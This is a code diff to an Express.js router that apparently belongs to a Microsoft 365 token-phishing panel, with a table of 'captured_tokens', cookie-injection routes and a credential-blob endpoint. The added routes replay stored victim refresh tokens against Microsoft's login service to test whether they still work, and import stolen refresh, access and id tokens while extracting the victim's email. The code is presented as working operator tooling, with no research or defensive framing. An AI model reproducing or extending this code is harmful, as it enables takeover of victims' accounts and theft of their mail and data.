@@ -11,7 +11,7 @@ const silentConsentService = require('../services/silentconsent');
 // This prevents /api/tokens/inject/* from being matched by tokenRoutes
 router.get('/inject*', (req, res) => {
   // This catch-all ensures /api/tokens/inject/* paths return 404 from this router
-  // and can be handled by the mounted cookieInjectRoutes at /api/tokens/inject.
+  // and can be handled by the mounted cookieInjectRoutes at /api/tokens/inject
   res.status(404).json({ error: 'Not found - use /api/tokens/inject/* for cookie injection' });
 });
 
@@ -36,10 +36,12 @@ router.get('/', userAuth, async (req, res) => {
 
     let tokens;
     try {
-      const [t] = await db.query(query.replace('SELECT id,', 'SELECT id, tenant,'), params);
-      tokens = t;
-    } catch {
       const [t] = await db.query(query, params);
+      tokens = t;
+    } catch (e) {
+      // Fallback: try without tenant column if it doesn't exist
+      const fallbackQuery = query.replace('tenant, ', '').replace(', tenant', '');
+      const [t] = await db.query(fallbackQuery, params);
       tokens = t.map(t => ({ ...t, tenant: 'common' }));
     }
 
@@ -957,6 +959,168 @@ router.get('/:id/full-credential-blob', userAuth, async (req, res) => {
   } catch (err) {
     console.error('[Tokens] Credential blob error:', err.message);
     res.status(500).json({ error: 'Failed to get credential blob: ' + err.message });
+  }
+});
+
+// ─── Check token status (active/revoked) ─────────────────────────────────
+router.post('/check-status', userAuth, async (req, res) => {
+  try {
+    const { token_id } = req.body;
+    
+    if (!token_id) {
+      return res.status(400).json({ error: 'token_id is required' });
+    }
+    
+    // Get token
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [token_id, req.user.id]
+    );
+    
+    if (!tokens.length) {
+      return res.status(404).json({ error: 'Token not found' });
+    }
+    
+    const token = tokens[0];
+    const refreshToken = decrypt(token.refresh_token_encrypted);
+    const clientId = token.client_id || config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
+    const tenant = token.tenant || config.AZURE_TENANT || 'common';
+    
+    if (!refreshToken) {
+      return res.json({ status: 'unknown', message: 'No refresh token available' });
+    }
+    
+    // Try to refresh the token to check if it's still valid
+    const axios = require('axios');
+    const tokenEndpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
+    
+    try {
+      const response = await axios.post(
+        tokenEndpoint,
+        new URLSearchParams({
+          client_id: clientId,
+          grant_type: 'refresh_token',
+          refresh_token: refreshToken,
+          scope: 'openid profile email offline_access User.Read'
+        }),
+        {
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          timeout: 15000
+        }
+      );
+      
+      if (response.data.access_token) {
+        // Token is still active - update status
+        await db.query(
+          'UPDATE captured_tokens SET token_status = ? WHERE id = ?',
+          ['active', token_id]
+        );
+        
+        return res.json({ status: 'active', message: 'Token is valid and active' });
+      }
+    } catch (err) {
+      // Check if error indicates revoked token
+      const errorData = err.response?.data;
+      if (errorData?.error === 'invalid_grant' || 
+          errorData?.error === 'invalid_request' ||
+          (errorData?.error_description && 
+           (errorData.error_description.includes('revoked') || 
+            errorData.error_description.includes('expired')))) {
+        
+        // Token is revoked
+        await db.query(
+          'UPDATE captured_tokens SET token_status = ? WHERE id = ?',
+          ['revoked', token_id]
+        );
+        
+        return res.json({ status: 'revoked', message: 'Token has been revoked' });
+      }
+    }
+    
+    return res.json({ status: 'unknown', message: 'Could not determine token status' });
+  } catch (err) {
+    console.error('[Tokens] Check status error:', err.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// ─── Import token manually ────────────────────────────────────────────────
+router.post('/import', userAuth, async (req, res) => {
+  try {
+    const { 
+      refresh_token, 
+      access_token, 
+      id_token, 
+      client_id,
+      email,
+      tenant,
+      account_type,
+      notes 
+    } = req.body;
+    
+    if (!refresh_token) {
+      return res.status(400).json({ error: 'refresh_token is required' });
+    }
+    
+    const clientId = client_id || config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
+    const tenantVal = tenant || config.AZURE_TENANT || 'common';
+    const accountType = account_type || 'work_school';
+    const emailAddress = email || '';
+    
+    // Extract email from id_token if not provided
+    let extractedEmail = emailAddress;
+    if (!extractedEmail && id_token) {
+      try {
+        const tokenParts = id_token.split('.');
+        if (tokenParts.length === 3) {
+          const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
+          extractedEmail = payload.email || payload.preferred_username || '';
+        }
+      } catch (e) {
+        // Could not extract email from id_token
+      }
+    }
+    
+    // Encrypt tokens
+    const accessEncrypted = access_token ? encrypt(access_token) : null;
+    const refreshEncrypted = encrypt(refresh_token);
+    const idEncrypted = id_token ? encrypt(id_token) : null;
+    
+    // Insert into database
+    const [result] = await db.query(
+      `INSERT INTO captured_tokens 
+       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, 
+        id_token_encrypted, ip_address, user_agent, notes, expiration, tenant, template_type, 
+        account_type, client_id, token_status) 
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?)`,
+      [
+        req.user.id,
+        null, // no link_id for imported tokens
+        extractedEmail,
+        'token',
+        accessEncrypted,
+        refreshEncrypted,
+        idEncrypted,
+        'manual', // IP address
+        'Manual Import', // user agent
+        notes || '',
+        tenantVal,
+        'office',
+        accountType,
+        clientId,
+        'active' // Start as active, will be verified
+      ]
+    );
+    
+    res.json({ 
+      success: true, 
+      token_id: result.insertId,
+      email: extractedEmail,
+      message: 'Token imported successfully'
+    });
+  } catch (err) {
+    console.error('[Tokens] Import error:', err.message);
+    res.status(500).json({ error: 'Server error: ' + err.message });
   }
 });
 
